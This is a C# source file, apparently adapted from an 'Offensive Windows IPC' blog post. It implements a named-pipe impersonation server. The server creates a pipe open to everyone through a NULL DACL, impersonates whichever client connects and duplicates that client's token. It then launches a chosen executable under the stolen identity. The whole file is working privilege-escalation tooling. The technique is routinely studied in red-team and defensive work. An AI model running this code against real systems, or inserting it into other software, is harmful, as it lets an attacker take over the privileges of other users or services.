//Adapted from https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html#prerequisites

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Reflection.Metadata;
using System.Security.Permissions;
using System.ComponentModel;
using static ImpersonationPipeServer.Native;
using System.Security.AccessControl;
using static ImpersonationPipeServer.Debug;

namespace ImpersonationPipeServer
{
    internal class Functions
    {
        public static void Initialisation(string[] args)
        {
            string pipeName = args[0];
            string name = @"\\.\pipe\" + pipeName;
            string targetExe = args[1];
            

            Console.Write("\nStarting Server... ");
            IntPtr handle = IntPtr.Zero;
            name = @"\\.\pipe\" + pipeName;
            var SecurityAttribute = GetNullDacl();
            handle = Native.CreateNamedPipe(name, 0x3, 0x4, 1, 2048, 2048, 0, SecurityAttribute);
            if (handle.ToInt32() == -1)
            {
                throw new Win32Exception("Error creating named pipe " + name + " . Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
            Console.WriteLine("Started!");

            Console.Write("Listening... ");
            bool connectedPipe = Native.ConnectNamedPipe(handle, IntPtr.Zero);
            Console.WriteLine("Connected!");
            
            Console.Write("Impersonating... ");
            bool impersonated = Native.ImpersonateNamedPipeClient(handle);
            if (!impersonated)
            {
                throw new Win32Exception("Error impersonating client. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
            Console.WriteLine("Success!");

            IntPtr hToken = IntPtr.Zero;
            bool success = Native.OpenThreadToken(Native.GetCurrentThread(), 0xF01FF, false, out hToken);
            if (!success)
            {
                throw new Win32Exception("Error getting thread token. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
            
            Console.Write("Reverting... ");
            success = Native.RevertToSelf();
            if (!success)
            {
                throw new Win32Exception("Error reverting to self. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
            Console.WriteLine("Success!");

            Console.WriteLine("Duplicating... ");
            IntPtr phNewToken = IntPtr.Zero;
            var SecurityAttribute2 = GetNullDacl();
            success = Native.DuplicateTokenEx(hToken, 0xF01FF, SecurityAttribute2, Native.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Native.TOKEN_TYPE.TokenPrimary, out phNewToken);
            if (!success)
            {
                throw new Win32Exception("Error duplicating token. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }

            uint outLen = 0;
            success = GetTokenInformation(phNewToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, outLen, out outLen);
            IntPtr TokenInformation = Marshal.AllocHGlobal(checked((int)(outLen)));
            success = GetTokenInformation(phNewToken, TOKEN_INFORMATION_CLASS.TokenUser, TokenInformation, outLen, out outLen);
            if (!success)
            {
                throw new Win32Exception("Error checking token SID. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
            Debug.TOKEN_USER TokenUser = (Debug.TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(Debug.TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = Debug.ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            Console.WriteLine("\nSpawning process...");
            Native.STARTUPINFO startupInfo = new Native.STARTUPINFO();
            Native.PROCESS_INFORMATION processInfo = new Native.PROCESS_INFORMATION();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            success = CreateProcessWithTokenW(phNewToken, 0, null, targetExe, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
            if (!success)
            {
                throw new Win32Exception("Error creating process. Internal error: " + Marshal.GetLastWin32Error().ToString());
            }
        }

        public static SECURITY_ATTRIBUTES GetNullDacl()
        {
            // Implemented from http://codemortem.blogspot.com/2006/01/creating-null-dacl-in-managed-code.html
            // Build NULL DACL (Allow everyone full access)
            RawSecurityDescriptor gsd = new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, null, null, null, null);

            // Construct SECURITY_ATTRIBUTES structure
            Native.SECURITY_ATTRIBUTES sa = new Native.SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(typeof(Native.SECURITY_ATTRIBUTES));
            sa.bInheritHandle = 1;

            // Get binary form of the security descriptor and copy it into place
            byte[] desc = new byte[gsd.BinaryLength];
            gsd.GetBinaryForm(desc, 0);
            sa.lpSecurityDescriptor = Marshal.AllocHGlobal(desc.Length); // This Alloc is Freed by the Disposer or Finalizer
            Marshal.Copy(desc, 0, sa.lpSecurityDescriptor, desc.Length);

            return sa;
        }
    }
}
